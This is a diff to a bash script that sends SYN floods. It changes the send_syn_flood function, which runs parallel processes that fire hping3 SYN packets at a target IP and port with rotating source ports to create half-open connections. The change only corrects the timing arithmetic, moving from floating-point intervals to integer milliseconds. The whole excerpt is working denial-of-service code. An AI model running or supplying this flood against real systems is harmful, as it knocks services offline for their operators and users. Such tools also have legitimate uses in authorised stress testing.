@@ -42,19 +42,23 @@ echo ""
 send_syn_flood() {
     local process_id=$1
     local packets_per_process=$((RATE / PARALLEL))
-    local interval=$(echo "scale=3; 1 / $packets_per_process" | bc -l)
+    local interval_ms=$((1000 / packets_per_process))  # Convert to milliseconds for integer math
     
-    echo "Process $process_id: Sending $packets_per_process packets/sec (interval: ${interval}s)"
+    echo "Process $process_id: Sending $packets_per_process packets/sec (interval: ${interval_ms}ms)"
     
     for ((i=0; i<$((packets_per_process * DURATION)); i++)); do
         # Use different source ports to create unique half-open connections
         local src_port=$((32768 + (process_id * 1000) + (i % 1000)))
         
         # Send SYN packet using hping3 (more reliable than nmap)
-        timeout 1 hping3 -S -p $TARGET_PORT -s $src_port -c 1 -i u$((interval * 1000000 / 1000)) $TARGET_IP >/dev/null 2>&1 &
+        timeout 1 hping3 -S -p $TARGET_PORT -s $src_port -c 1 -i u${interval_ms}000 $TARGET_IP >/dev/null 2>&1 &
         
-        # Rate limiting
-        sleep $interval 2>/dev/null || sleep 0.001
+        # Rate limiting using milliseconds
+        if [ $interval_ms -gt 0 ]; then
+            sleep 0.$(printf "%03d" $interval_ms) 2>/dev/null || sleep 0.001
+        else
+            sleep 0.001
+        fi
     done
 }
 
